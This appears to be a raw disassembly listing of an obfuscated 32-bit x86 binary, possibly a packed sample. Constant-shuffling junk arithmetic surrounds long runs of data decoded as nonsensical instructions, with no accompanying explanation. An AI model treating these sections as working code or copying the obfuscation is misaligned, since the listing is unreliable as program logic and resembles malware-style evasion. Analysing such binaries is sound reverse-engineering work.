  40e4de:	mov    ecx,DWORD PTR [ebp+0x8]
  40e4e1:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  40e4e8:	mov    DWORD PTR [ebp-0xc],0x327f
  40e4ef:	mov    DWORD PTR [ebp-0x14],0x5215
  40e4f6:	mov    DWORD PTR [ebp+0x8],0x2502
  40e4fd:	mov    eax,DWORD PTR [ebp+0x8]
  40e500:	add    eax,DWORD PTR [ebp-0x14]
  40e503:	mov    ecx,DWORD PTR [ebp-0xc]
  40e506:	and    eax,0x2bab
  40e50b:	lea    eax,[eax+ecx*1-0x557f]
  40e512:	mov    ecx,DWORD PTR [ebp+0xc]
  40e515:	mov    DWORD PTR [esi+eax*4],ecx
  40e518:	mov    DWORD PTR [ebp-0xc],edi
  40e51b:	mov    DWORD PTR [ebp+0x8],0x5f40
  40e522:	mov    DWORD PTR [ebp-0x14],0x6ba4
  40e529:	mov    DWORD PTR [ebp+0xc],0x7b17
  40e530:	mov    ecx,DWORD PTR [ebp+0x8]
  40e533:	jmp    0x40e7c2
  40e538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e539:	jno    0x40e4dc
  40e53b:	into   
  40e53c:	mov    ecx,0xb6b9b90d
  40e541:	jb     0x40e5b1
  40e543:	fnsave [esi-0x8]
  40e546:	sub    cl,dl
  40e548:	int    0x6
  40e54a:	mov    esi,0xbec299be
  40e54f:	mov    esi,0xdb5e8e76
  40e554:	scas   al,BYTE PTR es:[edi]
  40e555:	mov    cl,0x51
  40e557:	jno    0x40e55b
  40e559:	gs (bad) 
  40e55b:	loop   0x40e54b
  40e55d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e55e:	jp     0x40e595
  40e560:	add    al,0x3c
  40e562:	mov    ebx,0xb35b3021
  40e567:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e569:	mov    eax,ds:0x59819c80
  40e56e:	mov    dl,0xdf
  40e570:	or     eax,DWORD PTR [edx+0x135b946e]
  40e576:	cs jmp 0x40e53d
  40e579:	mov    al,ds:0x6513d2e4
  40e57e:	out    dx,eax
  40e57f:	lods   al,BYTE PTR ds:[esi]
  40e580:	idiv   BYTE PTR [ecx-0x46]
  40e583:	dec    edx
  40e584:	mov    bl,0xf2
  40e586:	sbb    al,0x5
  40e588:	xor    BYTE PTR [edi-0x40],dh
  40e58b:	call   0x44b5:0xd6d544bd
  40e592:	daa    
  40e593:	popa   
  40e594:	mov    eax,ds:0xbabe3f59
  40e599:	(bad)  
  40e59a:	mov    al,0xbe
  40e59c:	retf   
  40e59d:	jp     0x40e538
  40e59f:	arpl   WORD PTR [ebx+0x41],ax
  40e5a2:	xlat   BYTE PTR ds:[ebx]
  40e5a3:	mov    edx,0x762de8f1
  40e5a8:	push   edx
  40e5a9:	daa    
  40e5aa:	xor    esp,DWORD PTR [esi-0x4d]
  40e5ad:	pop    eax
  40e5ae:	sub    dh,BYTE PTR [esp+eax*4+0x18a2dcdc]
  40e5b5:	mov    DWORD PTR [edi],edx
  40e5b7:	sub    eax,0xbaa58915
  40e5bc:	fist   WORD PTR [edi+0x4341f34f]
  40e5c2:	push   eax
  40e5c3:	mov    eax,0x2f6ba7a1
  40e5c8:	js     0x40e5cb
  40e5ca:	or     ah,BYTE PTR [ecx+ebp*4]
  40e5cd:	arpl   WORD PTR ds:0x8646f061,dx
  40e5d3:	in     al,0xb3
  40e5d5:	fstp   DWORD PTR [ecx+0x25]
  40e5d8:	cwde   
  40e5d9:	loop   0x40e648
  40e5db:	jp     0x40e5e3
  40e5dd:	fs in  eax,dx
  40e5df:	adc    BYTE PTR [esi+0x55c78284],al
  40e5e5:	jns    0x40e59a
  40e5e7:	mov    al,ds:0xb4115b6c
  40e5ec:	xor    al,0xda
  40e5ee:	mov    ds:0x1c32c80e,eax
  40e5f3:	inc    edi
  40e5f4:	inc    edi
  40e5f5:	sahf   
  40e5f6:	enter  0x9509,0xcf
  40e5fa:	in     eax,dx
  40e5fb:	pop    esp
  40e5fc:	inc    ebp
  40e5fd:	or     bl,BYTE PTR [edi+0x731c8540]
  40e603:	aam    0x2
  40e605:	pop    ds
  40e606:	iret   
  40e607:	pop    ds
  40e608:	(bad)  
  40e609:	pushf  
  40e60a:	inc    esi
  40e60b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e60c:	(bad)  
  40e60d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e60e:	cmp    esp,edx
  40e610:	shr    DWORD PTR [ebx+0x39985437],1
  40e616:	aam    0xad
  40e618:	loopne 0x40e640
  40e61a:	xor    al,0x39
  40e61c:	cld    
  40e61d:	push   ecx
  40e61e:	xchg   eax,edi
  40e620:	out    0x14,eax
  40e622:	xchg   esp,eax
  40e623:	into   
  40e624:	mov    ecx,0xcdbf55c7
  40e629:	mov    ds:0x3b919122,al
  40e62e:	shl    BYTE PTR [ebx+0x29e41437],cl
  40e634:	dec    eax
  40e635:	mov    dl,0xb
  40e637:	(bad)  
  40e638:	fsubr  QWORD PTR [eax]
  40e63a:	loope  0x40e61a
  40e63c:	sbb    ecx,esp
  40e63e:	loop   0x40e68b
  40e640:	int3   
  40e641:	cmp    esp,DWORD PTR [ecx+0x5f]
  40e644:	ins    DWORD PTR es:[edi],dx
  40e645:	aad    0x96
  40e647:	not    DWORD PTR [eax]
  40e649:	loop   0x40e63d
  40e64b:	push   eax
  40e64c:	or     BYTE PTR [ebp-0x19b784ca],dh
  40e652:	fmul   DWORD PTR [ebx+0x59f67e34]
  40e658:	popa   
  40e659:	xchg   esi,eax
  40e65a:	aam    0x69
  40e65c:	pop    edx
  40e65d:	scas   al,BYTE PTR es:[edi]
  40e65e:	xor    BYTE PTR [ebp+0x1],al
  40e661:	ins    BYTE PTR es:[edi],dx
  40e662:	mov    eax,ds:0xd5839f0b
  40e667:	push   esp
  40e668:	pushf  
  40e669:	mov    bl,0x50
  40e66b:	sar    BYTE PTR [edi+0x45c69402],1
  40e671:	mov    ebx,DWORD PTR [ebx+0x2c]
  40e674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e675:	mov    cl,0x23
  40e677:	dec    edi
  40e678:	or     ah,bh
  40e67a:	pop    edx
  40e67b:	jmp    0x40e648
  40e67d:	dec    eax
  40e67e:	out    dx,al
  40e67f:	sbb    BYTE PTR [ebx+0x518721d7],0x6e
  40e686:	cmp    al,0x93
  40e688:	jge    0x40e6fc
  40e68a:	fs inc eax
  40e68c:	lock sub DWORD PTR [edx+0x61],esp
  40e690:	mov    edi,0xba4a771c
  40e695:	fdivr  QWORD PTR [ebp-0x41]
  40e698:	push   0x27598cfe
  40e69d:	sub    DWORD PTR [ecx+ebp*8+0x38],0x9aac7740
  40e6a5:	les    edi,FWORD PTR [ebp+0x47e5caf3]
  40e6ab:	xlat   BYTE PTR ds:[ebx]
  40e6ac:	jp     0x40e685
  40e6ae:	ret    
  40e6af:	pusha  
  40e6b0:	scas   al,BYTE PTR es:[edi]
  40e6b1:	pop    edi
  40e6b2:	push   edi
  40e6b3:	mov    esp,0x145100d2
  40e6b8:	hlt    
  40e6b9:	sub    eax,0x3b4ed76d
  40e6be:	retf   
  40e6bf:	adc    al,0x8d
  40e6c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6c2:	mov    dl,BYTE PTR [ebx]
  40e6c4:	xchg   ecx,eax
  40e6c5:	push   cs
  40e6c6:	pop    ecx
  40e6c7:	data16 (bad) 
  40e6c9:	fnstenv [ecx+0x5f]
  40e6cc:	and    edi,DWORD PTR [ecx+0x77da6085]
  40e6d2:	aaa    
  40e6d3:	in     al,0x4d
  40e6d5:	pop    edi
  40e6d6:	xchg   edx,eax
  40e6d7:	outs   dx,DWORD PTR ds:[esi]
  40e6d8:	xchg   edx,eax
  40e6d9:	push   es
  40e6da:	xor    al,dl
  40e6dc:	aaa    
  40e6dd:	xchg   ecx,eax
  40e6de:	imul   eax,DWORD PTR [ecx+0x47],0x2f622116
  40e6e5:	std    
  40e6e6:	push   eax
  40e6e7:	sbb    bl,BYTE PTR [edi]
  40e6e9:	sub    cl,BYTE PTR [eax-0x1c58e8df]
  40e6ef:	icebp  
  40e6f0:	cdq    
  40e6f1:	pop    esi
  40e6f2:	test   BYTE PTR [eax+edi*1-0x453abd9f],bl
  40e6f9:	add    DWORD PTR [esi],0xd0305dc4
  40e6ff:	mov    ch,0xfd
  40e701:	xor    ebp,DWORD PTR [edx+ecx*4]
  40e704:	pop    edi
  40e705:	sbb    dh,cl
  40e707:	into   
  40e708:	int3   
  40e709:	fcmovnb st,st(0)
  40e70b:	ins    DWORD PTR es:[edi],dx
  40e70c:	jle    0x40e6af
  40e70e:	add    al,0xd1
  40e710:	sar    DWORD PTR [ebx],0x9d
  40e713:	(bad)  
  40e714:	out    dx,eax
  40e715:	xchg   ebp,eax
  40e716:	dec    DWORD PTR [ebp-0x32e2cd30]
  40e71c:	pop    esi
  40e71d:	jl     0x40e742
  40e71f:	rcr    BYTE PTR [esi+0x62],cl
  40e722:	jmp    0x6708:0x9177380
  40e729:	ss stos DWORD PTR es:[edi],eax
  40e72b:	aam    0x68
  40e72d:	fstp   TBYTE PTR [ecx-0x534c89d4]
  40e733:	push   cs
  40e734:	call   DWORD PTR [edi-0x71e4aa51]
  40e73a:	sbb    DWORD PTR [ecx+0x17],ebx
  40e73d:	in     al,0xc7
  40e73f:	loope  0x40e710
  40e741:	sbb    eax,0xdbfa9f4b
  40e746:	je     0x40e78c
  40e748:	xlat   BYTE PTR ds:[ebx]
  40e749:	add    al,0xa7
  40e74b:	jno    0x40e6cd
  40e74d:	repnz mov edx,0x80423b20
  40e753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e754:	addr16 aad 0x37
  40e757:	and    al,0xec
  40e759:	add    eax,0x32bd44a7
  40e75e:	pop    ebp
  40e75f:	xchg   BYTE PTR [edx+ebp*2+0x47b33a75],bl
  40e766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e767:	pushf  
  40e768:	sti    
  40e769:	dec    esi
  40e76a:	clc    
  40e76b:	jns    0x40e78a
  40e76d:	pop    ss
  40e76e:	lds    ebp,FWORD PTR [esp+esi*1+0x348e0ca9]
  40e775:	(bad)  
  40e776:	cmp    eax,ecx
  40e778:	dec    edx
  40e779:	jle    0x40e74a
  40e77b:	out    0x85,al
  40e77d:	loope  0x40e782
  40e77f:	push   cs
  40e780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e781:	fisubr DWORD PTR [edx+0x66]
  40e784:	dec    esp
  40e785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e786:	int    0xe
  40e788:	inc    ecx
  40e789:	out    0x6,al
  40e78b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e78c:	lock sub al,BYTE PTR [eax]
  40e78f:	inc    ebx
  40e790:	sbb    eax,0x7e9ab85e
  40e795:	jnp    0x40e7d9
  40e797:	and    dl,bh
  40e799:	fbstp  TBYTE PTR [esi+0x6b]
  40e79c:	push   es
  40e79d:	mov    ds:0x838496cd,al
  40e7a2:	retf   0x49f6
  40e7a5:	pop    ecx
  40e7a6:	sub    al,0xb8
  40e7a8:	data16 xlat BYTE PTR ds:[ebx]
  40e7aa:	cld    
  40e7ab:	push   eax
  40e7ac:	out    dx,al
  40e7ad:	(bad)  
  40e7ae:	fstp   TBYTE PTR [ecx+0x3bba7fb2]
  40e7b4:	mov    ch,0xe6
  40e7b6:	outs   dx,DWORD PTR ds:[esi]
  40e7b7:	ret    0xba54
  40e7ba:	cmp    DWORD PTR [esp+edx*2],edx
  40e7bd:	test   BYTE PTR [esi],al
  40e7bf:	sbb    BYTE PTR [eax],dh
  40e7c1:	or     al,0xb8
  40e7c3:	rol    BYTE PTR [ebx+0x0],cl
  40e7c6:	add    BYTE PTR [ebx],ch
  40e7c8:	rol    DWORD PTR [ebx],0x45
  40e7cb:	or     al,0x33
  40e7cd:	rol    BYTE PTR [ebx],cl
  40e7cf:	inc    ebp
  40e7d0:	in     al,dx
  40e7d1:	mov    ecx,DWORD PTR [ebp-0xc]
  40e7d4:	div    ecx
  40e7d6:	mov    ecx,DWORD PTR [ebp+0x10]
  40e7d9:	xor    edx,edx
  40e7db:	pop    edi
  40e7dc:	pop    ebx
  40e7dd:	or     eax,0x67ad
  40e7e2:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  40e7e9:	mov    DWORD PTR [ebp+0x10],0x517b
  40e7f0:	mov    DWORD PTR [ebp+0xc],0x5d62
  40e7f7:	mov    DWORD PTR [ebp+0x8],0x41b0
  40e7fe:	mov    ecx,DWORD PTR [ebp+0x8]
  40e801:	mov    eax,DWORD PTR [ebp+0xc]
  40e804:	and    ecx,0x68c1
  40e80a:	sub    ecx,0x6fd3
  40e810:	or     ecx,eax
  40e812:	mov    eax,DWORD PTR [ebp+0x10]
  40e815:	imul   ecx,eax
  40e818:	mov    eax,0xf52840d5
  40e81d:	div    ecx
  40e81f:	leave  
  40e820:	ret    0xc
  40e823:	push   ebp
  40e824:	mov    ebp,esp
  40e826:	sub    esp,0xc0
  40e82c:	push   esi
  40e82d:	mov    DWORD PTR [ebp-0x80],0x2f93
  40e834:	mov    DWORD PTR [ebp-0x7c],0x3321
  40e83b:	mov    DWORD PTR [ebp-0x70],0x7d00
  40e842:	mov    DWORD PTR [ebp-0x6c],0xd87
  40e849:	jmp    0x40eb8c
  40e84e:	xor    dl,BYTE PTR [ecx]
  40e850:	sub    al,0x76
  40e852:	sub    al,0x78
  40e854:	mov    ah,0x99
  40e856:	sahf   
  40e857:	mov    ?,WORD PTR [eax+0x72adeecf]
  40e85d:	(bad)  [edx+0x1bebe0a]
  40e863:	les    edi,FWORD PTR [esi-0x6448a942]
  40e869:	mov    bh,BYTE PTR [edi+0x6c]
  40e86c:	hlt    
  40e86d:	jb     0x40e86c
  40e86f:	in     eax,dx
  40e870:	push   cs
  40e871:	jmp    0x1596:0xf06681bd
  40e878:	in     al,dx
  40e879:	sbb    bl,bl
  40e87b:	or     eax,0x88457103
  40e880:	pop    ss
  40e881:	out    0x34,eax
  40e883:	nop
  40e884:	sbb    al,0x19
  40e886:	ins    DWORD PTR es:[edi],dx
  40e887:	shl    BYTE PTR [eax-0x2b38578c],1
  40e88d:	pop    ss
  40e88e:	jnp    0x40e8ce
  40e890:	cmp    bl,BYTE PTR [ebx+0x64]
  40e893:	(bad)  
  40e894:	dec    edi
  40e895:	inc    dl
  40e897:	sub    BYTE PTR [edx-0x1],dh
  40e89a:	add    eax,0x52bd978e
  40e89f:	cwde   
  40e8a0:	add    al,0xf
  40e8a2:	stos   DWORD PTR es:[edi],eax
  40e8a3:	cmc    
  40e8a4:	out    dx,eax
  40e8a5:	in     al,dx
  40e8a6:	add    BYTE PTR ss:[ebp+0x4a26f327],0x6b
  40e8ae:	mov    eax,ds:0x44ac5a0c
  40e8b3:	fcom   DWORD PTR [ecx+0x61]
  40e8b6:	ss int 0x96
  40e8b9:	or     al,0xb7
  40e8bb:	repz mov eax,0x8471359b
  40e8c1:	sbb    edx,DWORD PTR [ebx-0x3ab73a8c]
  40e8c7:	and    al,0x96
  40e8c9:	push   0xdda148f1
  40e8ce:	mov    edx,0x50a8ca86
  40e8d3:	jns    0x40e939
  40e8d5:	scas   eax,DWORD PTR es:[edi]
  40e8d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8d7:	mov    gs,esi
  40e8d9:	xchg   BYTE PTR [esi+0x74a0ed4a],dh
  40e8df:	icebp  
  40e8e0:	aam    0x69
  40e8e2:	lea    esi,[eax-0x80c511c]
  40e8e8:	pop    esi
  40e8e9:	test   bl,dl
  40e8eb:	sub    DWORD PTR ds:0x319a191e,edx
  40e8f1:	popf   
  40e8f2:	and    al,0x84
  40e8f4:	(bad)  
  40e8f6:	(bad)  
  40e8f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8f8:	inc    ecx
  40e8f9:	leave  
  40e8fa:	jo     0x40e91e
  40e8fc:	jl     0x40e97c
  40e8fe:	dec    edx
  40e8ff:	lock leave 
  40e901:	(bad)  
  40e902:	mov    BYTE PTR [esi+0x32],0x1e
  40e906:	dec    ecx
  40e907:	mov    al,ds:0xaec9e2bd
  40e90c:	dec    eax
  40e90d:	jl     0x40e8ea
  40e90f:	imul   ebp,edx,0x9904b7cc
  40e915:	fsub   DWORD PTR [ecx+0xe]
  40e918:	icebp  
  40e919:	dec    edx
  40e91a:	icebp  
  40e91b:	ret    0x87ae
  40e91e:	ins    DWORD PTR es:[edi],dx
  40e91f:	imul   ecx,DWORD PTR [eax-0x41],0x50176376
  40e926:	mov    ds:0x56c2d242,al
  40e92b:	ficomp DWORD PTR [edi+esi*4]
  40e92e:	std    
  40e92f:	shl    BYTE PTR [ecx],1
  40e931:	inc    ebp
  40e932:	sub    BYTE PTR [ecx-0x378b5826],ch
  40e938:	in     eax,dx
  40e939:	sbb    al,0xe9
  40e93b:	mov    dl,0xf3
  40e93d:	aaa    
  40e93e:	stos   DWORD PTR es:[edi],eax
  40e93f:	cdq    
  40e940:	lods   eax,DWORD PTR ds:[esi]
  40e941:	fs int3 
  40e943:	into   
  40e944:	ins    BYTE PTR es:[edi],dx
  40e945:	push   0x7e6ecd52
  40e94a:	xchg   BYTE PTR [ebp+0x27],cl
  40e94d:	xor    edx,DWORD PTR [ecx+0x1a0ee6e7]
  40e953:	inc    ebx
  40e954:	fadd   DWORD PTR [edi]
  40e956:	jb     0x40e97e
  40e958:	xor    ebx,ebp
  40e95a:	mov    WORD PTR [eax],fs
  40e95c:	shl    DWORD PTR [edi],0x19
  40e95f:	int3   
  40e960:	ds pop ss
  40e962:	add    BYTE PTR [ebx-0x6c],bh
  40e965:	enter  0xace2,0x5e
  40e969:	and    ebx,0xffffff95
  40e96c:	(bad)  
  40e96d:	int    0x42
  40e96f:	loopne 0x40e8fc
  40e971:	jp     0x40e99f
  40e973:	or     ebp,DWORD PTR [esi]
  40e975:	out    0x41,eax
  40e977:	xor    esi,DWORD PTR [ecx]
  40e979:	mov    ebp,0x89505b38
  40e97e:	in     al,0xe8
  40e980:	nop
  40e981:	scas   al,BYTE PTR es:[edi]
  40e982:	(bad)  
  40e984:	mov    BYTE PTR [eax+esi*4-0x750c24bc],dh
  40e98b:	pop    edx
  40e98c:	shr    BYTE PTR [eax+eax*8],0xa6
  40e990:	lods   eax,DWORD PTR ds:[esi]
  40e991:	cmp    ebx,DWORD PTR [ebx+0x9]
  40e994:	nop
  40e995:	add    al,0x8f
  40e997:	and    edi,edi
  40e999:	mov    dh,0x8e
  40e99b:	lock add DWORD PTR [ebx],0xffffffd0
  40e99f:	test   eax,0x1fa82d87
  40e9a4:	inc    edx
  40e9a5:	sahf   
  40e9a6:	call   0xeae6:0x2e68ace5
  40e9ad:	xor    eax,0x5e344c4a
  40e9b2:	adc    al,0xfb
  40e9b4:	cwde   
  40e9b5:	or     DWORD PTR [ecx],ebp
  40e9b7:	jmp    0x30c2:0xc3ad2577
  40e9be:	mov    edi,0x77b0011
  40e9c3:	sub    cl,BYTE PTR [esi+0x8429262]
  40e9c9:	out    dx,al
  40e9ca:	gs fcmovnb st,st(3)
  40e9cd:	fdivr  QWORD PTR [eax+0xa]
  40e9d0:	xchg   DWORD PTR [ebp+0x73c757b2],edi
  40e9d6:	ins    DWORD PTR es:[edi],dx
  40e9d7:	popf   
  40e9d8:	inc    edx
  40e9d9:	and    al,0x15
  40e9db:	sub    al,0xa2
  40e9dd:	pop    ebx
  40e9de:	das    
  40e9df:	imul   eax,esi,0x4d4350e2
  40e9e5:	es jbe 0x40e9a2
  40e9e8:	in     al,0x74
  40e9ea:	mov    eax,ds:0xe80f13b3
  40e9ef:	push   edx
  40e9f0:	fiadd  WORD PTR [ecx]
  40e9f2:	cli    
  40e9f3:	jl     0x40ea55
  40e9f5:	mov    dh,BYTE PTR [eax-0x19]
  40e9f8:	fsub   st,st(7)
  40e9fa:	xrelease xchg DWORD PTR [eax-0x7479a4a7],eax
  40ea01:	mov    al,ds:0xc2d7148e
  40ea06:	fist   DWORD PTR [ebp+ebx*4+0x67]
  40ea0a:	jbe    0x40ea62
  40ea0c:	mov    WORD PTR [ecx-0x3e1c364d],cs
  40ea12:	loope  0x40ea6a
  40ea14:	dec    ebx
  40ea15:	mov    bh,0x53
  40ea17:	out    dx,al
  40ea18:	jmp    0x96476e1d
  40ea1d:	and    eax,0x845f2c11
  40ea22:	xchg   edx,eax
  40ea23:	jno    0x40e9ea
  40ea25:	add    dh,ah
  40ea27:	inc    eax
  40ea28:	sub    dh,BYTE PTR [edx+0x5a]
  40ea2b:	jno    0x40ea58
  40ea2d:	jne    0x40ea94
  40ea2f:	sbb    eax,0x585537c6
  40ea34:	jle    0x40ea50
  40ea36:	adc    ch,0x17
  40ea39:	out    0x44,eax
  40ea3b:	push   ecx
  40ea3c:	hlt    
  40ea3d:	mov    DWORD PTR [eax-0x5a031cc4],ecx
  40ea43:	add    al,0x24
  40ea45:	sbb    ebp,0x9623a888
  40ea4b:	mov    edx,0x4ec0299c
  40ea50:	xor    al,0x14
  40ea52:	pop    ebp
  40ea53:	and    al,0xf7
  40ea55:	push   ecx
  40ea56:	pop    edx
  40ea57:	push   0x242a46e7
  40ea5c:	xor    edi,DWORD PTR [eax+esi*8-0x68]
  40ea60:	cmp    eax,0x7d3b6f37
  40ea65:	call   0x96a5:0xa636ed78
  40ea6c:	jae    0x40ea5a
  40ea6e:	add    al,0x92
  40ea70:	push   edx
  40ea71:	or     eax,0xf85a8e16
  40ea76:	dec    ebx
  40ea77:	xchg   esi,eax
  40ea78:	popa   
  40ea79:	mov    ebp,0xe1cc570e
  40ea7e:	inc    ebx
  40ea7f:	popa   
  40ea80:	rol    BYTE PTR [edx-0x38],1
  40ea83:	mov    al,ds:0x7963e1ab
  40ea88:	push   eax
  40ea89:	jns    0x40ea4b
  40ea8b:	push   edx
  40ea8c:	int    0xc1
  40ea8e:	adc    edi,DWORD PTR [eax+0x14]
  40ea91:	push   0xffffffa6
  40ea93:	inc    ecx
  40ea94:	push   eax
  40ea95:	inc    ecx
  40ea96:	pop    ss
  40ea97:	or     dl,BYTE PTR [edx+0xb]
  40ea9a:	pusha  
  40ea9b:	enter  0x42f2,0xaa
  40ea9f:	mov    ds:0xbd8f1f11,eax
  40eaa4:	call   0x4404:0xdf232b7f
  40eaab:	mov    ebx,0xc2ae89a1
  40eab0:	jp     0x40ea84
  40eab2:	sub    ecx,DWORD PTR [edx+0x6a8525d5]
  40eab8:	cmp    cl,dl
  40eaba:	out    dx,eax
  40eabb:	stos   DWORD PTR es:[edi],eax
  40eabc:	add    esp,DWORD PTR [edx-0x6f]
  40eabf:	jle    0x40ea9e
  40eac1:	sub    ebp,ebp
  40eac3:	int    0xbf
  40eac5:	bound  edx,QWORD PTR [esi]
  40eac7:	mov    dh,0xec
  40eac9:	inc    ebx
  40eaca:	hlt    
  40eacb:	out    dx,eax
  40eacc:	jle    0x40eaa0
  40eace:	adc    al,0x38
  40ead0:	cli    
  40ead1:	and    bh,BYTE PTR [eax]
  40ead3:	jne    0x40eac4
  40ead5:	inc    edi
  40ead6:	mov    bl,0x7d
  40ead8:	scas   eax,DWORD PTR es:[edi]
  40ead9:	mov    esi,0x6d87a167
  40eade:	fninit 
  40eae0:	or     al,0x8b
  40eae2:	jne    0x40eac2
  40eae4:	pop    ss
  40eae5:	push   DWORD PTR [ecx-0x122a04e1]
  40eaeb:	mov    cs,WORD PTR [edi-0x83a12d7]
  40eaf1:	out    dx,al
  40eaf2:	mov    bh,0x60
  40eaf4:	pop    eax
  40eaf5:	inc    edx
  40eaf6:	loop   0x40ea8a
  40eaf8:	femms  
  40eafa:	dec    ebx
  40eafb:	imul   DWORD PTR [ebp+0x4f]
  40eafe:	adc    DWORD PTR [eax],0xffffff98
  40eb01:	sahf   
  40eb02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb03:	dec    DWORD PTR [ebp+0x6988650f]
  40eb09:	cs pop es
  40eb0b:	mov    eax,0x69538abe
  40eb10:	jl     0x40eacf
  40eb12:	pop    esp
  40eb13:	retf   
  40eb14:	pop    edx
  40eb15:	mov    cl,dl
  40eb17:	enter  0xdd1,0x6d
  40eb1b:	in     eax,0x9
  40eb1d:	xor    ebp,DWORD PTR [edi-0xddb0622]
  40eb23:	pop    esi
  40eb24:	xor    al,0x9f
  40eb26:	fdiv   DWORD PTR [ebp+0xd]
  40eb29:	xor    BYTE PTR [esi],bh
  40eb2b:	xor    esi,DWORD PTR [ecx-0x4511cdb3]
  40eb31:	inc    ecx
  40eb32:	cmp    eax,0x2d502b23
  40eb37:	dec    esp
  40eb38:	sti    
  40eb39:	mov    ch,BYTE PTR [ecx-0x6e]
  40eb3c:	jecxz  0x40eacc
  40eb3e:	sbb    al,0x5f
  40eb40:	cmc    
  40eb41:	dec    esp
  40eb42:	cld    
  40eb43:	inc    ebx
  40eb44:	add    edi,DWORD PTR [esi+0x6b]
  40eb47:	int    0xde
  40eb49:	sbb    bh,BYTE PTR [ecx-0x49b1005b]
  40eb4f:	jmp    0x7b0cc7b7
  40eb54:	jecxz  0x40eb0b
  40eb56:	push   edx
  40eb57:	daa    
  40eb58:	xor    eax,0x3eac13da
  40eb5d:	rcl    DWORD PTR ds:0x110f83ab,1
  40eb63:	call   0xe5258e83
  40eb68:	mov    ebx,fs
  40eb6a:	xor    eax,ecx
  40eb6c:	sahf   
  40eb6d:	(bad)  
  40eb6e:	jl     0x40ebd9
  40eb70:	or     BYTE PTR [esi+0x78cf6793],bh
  40eb76:	ds sbb al,dl
  40eb79:	inc    esi
  40eb7a:	loope  0x40ebc5
  40eb7c:	fld    TBYTE PTR ds:0xfa630456
  40eb82:	sub    eax,0xc63e0c62
  40eb87:	xchg   ecx,eax
  40eb88:	(bad)  
  40eb89:	lock jmp 0x4197:0xa045c715
  40eb91:	add    BYTE PTR [eax],al
  40eb93:	mov    DWORD PTR [ebp-0x5c],0xa7d
  40eb9a:	mov    DWORD PTR [ebp-0x50],0x772d
  40eba1:	mov    DWORD PTR [ebp-0x4c],0x37d8
  40eba8:	mov    DWORD PTR [ebp-0x40],0x414a
  40ebaf:	mov    DWORD PTR [ebp-0x3c],0x55ef
  40ebb6:	mov    DWORD PTR [ebp-0x30],0x136b
  40ebbd:	mov    DWORD PTR [ebp-0x2c],0x53e4
  40ebc4:	mov    DWORD PTR [ebp-0x20],0x32d8
  40ebcb:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  40ebd2:	mov    DWORD PTR [ebp-0xc],0x3956
  40ebd9:	mov    DWORD PTR [ebp-0xa4],0x4e57
  40ebe3:	mov    DWORD PTR [ebp-0x94],0x1
  40ebed:	mov    DWORD PTR [ebp-0x14],0x17ab
  40ebf4:	mov    DWORD PTR [ebp-0x64],0x7a3d
  40ebfb:	mov    DWORD PTR [ebp-0x54],0x378a
  40ec02:	mov    DWORD PTR [ebp-0x74],0x5a00
  40ec09:	mov    DWORD PTR [ebp-0x24],0x1f3a
  40ec10:	mov    DWORD PTR [ebp-0x84],0x9a225
  40ec1a:	mov    DWORD PTR [ebp-0x44],0x31f8
  40ec21:	mov    DWORD PTR [ebp-0x34],0x3663
  40ec28:	mov    DWORD PTR [ebp-0xb4],0x3165
  40ec32:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  40ec3c:	mov    DWORD PTR [ebp-0xbc],0x43cc
  40ec46:	mov    DWORD PTR [ebp-0xb0],0x7564
  40ec50:	mov    DWORD PTR [ebp-0xac],0x18cf
  40ec5a:	mov    DWORD PTR [ebp-0xa0],0x3135
  40ec64:	mov    DWORD PTR [ebp-0x9c],0x568d
  40ec6e:	mov    DWORD PTR [ebp-0x90],0x11f2
  40ec78:	mov    DWORD PTR [ebp-0x8c],0x63ea
  40ec82:	mov    DWORD PTR [ebp-0x10],0x3066
  40ec89:	mov    DWORD PTR [ebp-0x8],0x6ed2
  40ec90:	push   0x7e1d
  40ec95:	mov    DWORD PTR [ebp-0x4],0x30f4
  40ec9c:	mov    eax,DWORD PTR [ebp-0x20]
  40ec9f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40eca2:	push   0x5380
  40eca7:	push   ecx
  40eca8:	push   eax
  40eca9:	call   0x41594e
  40ecae:	mov    ecx,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x30]
  40ecb3:	xor    ecx,eax
  40ecb5:	mov    esi,edx
  40ecb7:	mov    edx,DWORD PTR [ebp-0x2c]
  40ecba:	mov    eax,DWORD PTR [ebp-0x40]
  40ecbd:	xor    esi,edx
  40ecbf:	mov    edx,DWORD PTR [ebp-0x3c]
  40ecc2:	xor    ecx,0xf3a
  40ecc8:	or     ecx,eax
  40ecca:	mov    eax,ds:0x422708
  40eccf:	mov    eax,DWORD PTR [eax+0x1d8]
  40ecd5:	mov    eax,DWORD PTR [eax]
  40ecd7:	xor    esi,0x6665
  40ecdd:	or     esi,edx
  40ecdf:	add    ecx,0xef6a96a5
  40ece5:	cdq    
  40ece6:	adc    esi,0xc8b6a000
  40ecec:	cmp    eax,ecx
  40ecee:	jne    0x40ecfc
  40ecf4:	cmp    edx,esi
  40ecf6:	je     0x40ed5b
  40ecfc:	mov    eax,DWORD PTR [ebp-0x50]
  40ecff:	mov    ecx,DWORD PTR [ebp-0x4c]
  40ed02:	mov    edx,DWORD PTR [ebp-0x60]
  40ed05:	mov    esi,DWORD PTR [ebp-0x5c]
  40ed08:	add    eax,0x7818
  40ed0d:	adc    ecx,0x87
  40ed13:	or     eax,edx
  40ed15:	mov    edx,DWORD PTR [ebp-0x70]
